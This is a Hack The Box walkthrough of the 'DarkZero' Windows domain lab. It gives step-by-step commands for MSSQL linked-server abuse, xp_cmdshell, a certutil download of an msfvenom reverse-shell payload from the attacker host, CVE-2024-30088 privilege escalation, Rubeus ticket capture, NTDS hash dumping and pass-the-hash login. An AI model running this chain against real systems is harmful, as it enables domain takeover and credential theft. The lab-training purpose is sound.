---
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# DarkZero Season 9 Machine Walk-through

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

***

_Welcome! This write-up walks through the_ **DarkZero** _season 9 machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

#### About Machine

#### Machine Info

* **Machine Name:** DarkZero
* **Machine OS: Windows**&#x20;
* **Difficulty:** Hard
* Machine Link: \[[https://app.hackthebox.com/machines/DarkZero](https://app.hackthebox.com/machines/DarkZero)]

As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w` / `RFulUtONCOL!`

> **Note:** In some of the next steps we may get a “Clock skew too great” error. Then run the following command to fix the problem: `sudo ntpdate <target>`

> Because Kerberos is very sensitive to time synchronization. If the clock difference between your machine and the target machine is more than 5 minutes, authentication fails. This is a security feature in Kerberos to prevent replay attacks.

#### Initial Scanning:

```bash
nmap -sV -sC -T4 10.10.11.89 -oN NmapScan.txt 

                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 21:08 IST
Nmap scan report for darkzero.htb (10.10.11.89)
Host is up (0.085s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 22:12:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.89:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-10-10T22:13:48+00:00; +6h33m11s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-10T21:56:10
|_Not valid after:  2055-10-10T21:56:10
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h33m10s, deviation: 0s, median: 6h33m09s
| smb2-time: 
|   date: 2025-10-10T22:13:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.86 seconds
```

Add `DC01.darkzero.htb` and `darkzero.htb` to `/etc/hosts`:

```bash
 sudo echo "10.10.11.89 DC01.darkzero.htb darkzero.htb" | sudo tee -a /etc/hosts
```

We try to retrieves all available DNS record types and we found this:

```bash
dig @DC01.darkzero.htb ANY darkzero.htb
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Aw4i41ZR-FGkxQJBVTqcyQ.png" alt=""><figcaption></figcaption></figure>

meaning it had two IP addresses (10.10.11.89 and 172.16.20.1).

#### SMB user Enumeration:

```bash
sudo nxc smb DC01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' --users
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*foJOxHn_k04g7w7Tw1cFRQ.png" alt=""><figcaption></figcaption></figure>

#### SMB Shares Enumeration:

```bash
smbmap -H 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!'
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*nc8D7nTaIAntce9y6n9Gng.png" alt=""><figcaption></figcaption></figure>

#### Enumerate SQL Server&#x20;

The SQL server on port 1433 looked promising. We try to connect with our credentials `john.w / RFulUtONCOL!` :

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@10.10.11.89 -windows-auth
```

And Boom! we successfully connected with SQL server.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Z2x-BpeDnpbwtv_Or7_Imw.png" alt=""><figcaption></figcaption></figure>

After many analysis we found another domain controller (Linked Server) called: `DC02.darkzero.ext`.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*htczRuUS7Quz3VC7sH7ERA.png" alt=""><figcaption></figcaption></figure>

Now try to switch to the `DC02.darkzero.ext` linked server:

```bash
use_link "DC02.darkzero.ext"
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*xFBI4P5flIY7_58PLqDwfQ.png" alt=""><figcaption></figcaption></figure>

We successfully switched `DC02.darkzero.ext` becouse the SQL service on DC01 connected to DC02 using different credentials (`dc01_sql_svc`) that had admin privileges on DC02.&#x20;

Credentials:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Uhi7g2E6PbjbypNNHxkSLA.png" alt=""><figcaption></figcaption></figure>

Now try to execute command on DC02 to get reverse shell.

```bash
enable_xp_cmdshell
xp_cmdshell whoami
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*kMtGzDOZIVUG69q5Bpaclg.png" alt=""><figcaption></figcaption></figure>

Open Another terminal and create a reverse shell payload using msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.131 LPORT=4444 -f exe > revshell.exe
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*9-Ed-RtysUB_vzWYyjnDWQ.png" alt=""><figcaption></figcaption></figure>

Run the python server to share the payload:

```bash
python3 -m http.server
```

Now go to SQL terminal and run the following command to download the payload to remote machine:

```bash
xp_cmdshell "certutil -urlcache -split -f http://10.10.14.131:8000/revshell.exe C:\Users\Public\revshell.exe"
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*TpA2Jr6vbSzQU_2O78vKTg.png" alt=""><figcaption></figcaption></figure>

Now Run the following command to get reverse shell:

```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.131
set LPORT 4444
exploit
```

Now execute the payload by using this command:

```bash
xp_cmdshell "C:\Users\Public\revshell.exe"
```

And Boom! we get meterpreter session:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*ZK5bIsg3H1VQDOh0aAsTOw.png" alt=""><figcaption></figcaption></figure>

We check the network interface, and we see this:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*fR3I26w7p0SNxUWOxWQ6gQ.png" alt=""><figcaption></figcaption></figure>

`svc_sql` user had limited privileges, so we needed to escalate. we used [CVE-2024-30088](https://nvd.nist.gov/vuln/detail/cve-2024-30088), a Windows privilege escalation vulnerability:

> About CVE-2024–30088:
>
> On June 11, 2024, Microsoft patched a critical vulnerability in the Windows Kernel designated **CVE-2024–30088**, arising from a classic **TOCTOU (Time-Of-Check to Time-Of-Use) race condition**. ([NVD](https://nvd.nist.gov/vuln/detail/cve-2024-30088?utm_source=chatgpt.com)) An attacker with low-level access could exploit the narrow window between validation (check) and execution (use) of security attributes in kernel code to poison or redirect memory, thereby escalating their privileges to SYSTEM. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/msft-cve-2024-30088/?utm_source=chatgpt.com)) Because this flaw sits at the core of kernel/user boundary logic, successful exploitation can undermine system integrity, confidentiality, and availability. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/msft-cve-2024-30088/?utm_source=chatgpt.com))
>
> Rated **CVSS 3.1 base score 7.0 (High)**, this vulnerability requires **local** access (not remote) but no user interaction, and has already been added to **CISA’s Known Exploited Vulnerabilities Catalog** — meaning adversaries are actively abusing it in real-world attacks. ([NVD](https://nvd.nist.gov/vuln/detail/cve-2024-30088?utm_source=chatgpt.com)) Microsoft’s fix closes the race window by revalidating or securing memory transitions and applying kernel-level mitigations. ([Medium](https://medium.com/%40shira.borochovich/cve-2024-30088-kernel-level-toctou-vulnerability-abused-by-apt34-for-privilege-escalation-in-5a75035bf076?utm_source=chatgpt.com))

Now run the following command in Meterpreter to escalate our privilege:

```bash
bg 
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION 1
set LHOST 10.10.14.131
set LPORT 4242
exploit
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*2ANu10SBCtdw0Kf4XzNdlQ.png" alt=""><figcaption></figcaption></figure>

Now we successfully escalate our privilege to `NT AUTHORITY\SYSTEM`.\
And also we got user flag.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*mWzDiWhwMUjYEanrp_8amg.png" alt=""><figcaption></figcaption></figure>

Now we try to extract Kerberos tickets.&#x20;

To do this here we use [Rubeus](https://github.com/michalszalkowski/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe) tool to capture Kerberos tickets.

```bash
upload Rubeus.exe C:\\Windows\\Tasks\\Rubeus.exe
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*X4_jp4c-sehswq5LcDZ5TQ.png" alt=""><figcaption></figcaption></figure>

Now run the tool to capture tickets:

```bash
shell

Rubeus.exe monitor /interval:1 /nowrap
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*13nSot7nhdVYvjhqR-Ea8w.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*YiIzP3nuPTCfsJ-XZJbifQ.png" alt=""><figcaption></figcaption></figure>

We successfully got Kerberos Ticket of DC01. But the captured ticket was in base64 format, so we needed to decode it.&#x20;

First we store the Base64 ticket to a file called `krb_B64.kirbi:`

Now run the following command to decode it:

```bash
cat krb_B64.kirbi | base64 -d > ticket.kirbi
```

Then, we converted it to a format usable by Impacket:

```bash
impacket-ticketConverter ticket.kirbi dc01_admin.ccache
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*7HPL_IxX32SDHTnFkJj6vw.png" alt=""><figcaption></figcaption></figure>

Now export the ticket:

```bash
export KRB5CCNAME=dc01_admin.ccache
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Fq3KpkmdcQGt5KCmskNzsA.png" alt=""><figcaption></figcaption></figure>

Now we had a valid Kerberos ticket for DC01’s machine account. and we could use this to dump all the password hashes from DC01:

```bash
impacket-secretsdump -k -no-pass -debug -dc-ip 10.10.11.89 'darkzero.htb/DC01$@DC01.darkzero.htb'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.13/site-packages/impacket
[+] Using Kerberos Cache: dc01_admin.ccache
[+] SPN CIFS/DC01.DARKZERO.HTB@DARKZERO.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/DARKZERO.HTB@DARKZERO.HTB
[+] Using TGT from cache
[+] Trying to connect to KDC at 10.10.11.89:88
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_LAKajWAU
[+] Trying to connect to KDC at 10.10.11.89:88
[+] Calling DRSGetNCChanges for S-1-5-21-1152179935-589108180-1989892463-500 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=darkzero,DC=htb
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSGetNCChanges for S-1-5-21-1152179935-589108180-1989892463-501 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=darkzero,DC=htb
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSGetNCChanges for S-1-5-21-1152179935-589108180-1989892463-502 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=darkzero,DC=htb
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSGetNCChanges for S-1-5-21-1152179935-589108180-1989892463-2603 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=john.w,CN=Users,DC=darkzero,DC=htb
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSGetNCChanges for S-1-5-21-1152179935-589108180-1989892463-1000 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=DC01,OU=Domain Controllers,DC=darkzero,DC=htb
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSGetNCChanges for S-1-5-21-1152179935-589108180-1989892463-2602 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=darkzero-ext$,CN=Users,DC=darkzero,DC=htb
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up...
```

Now try to log into DC01 by using evil-winrm:

```bash
evil-winrm -i 10.10.11.89 -u Administrator -H <hash>
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*68TI1J2NPMsBeY-rj5TwPQ.png" alt=""><figcaption></figcaption></figure>

And Boom! We successfully get Root Flag.

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
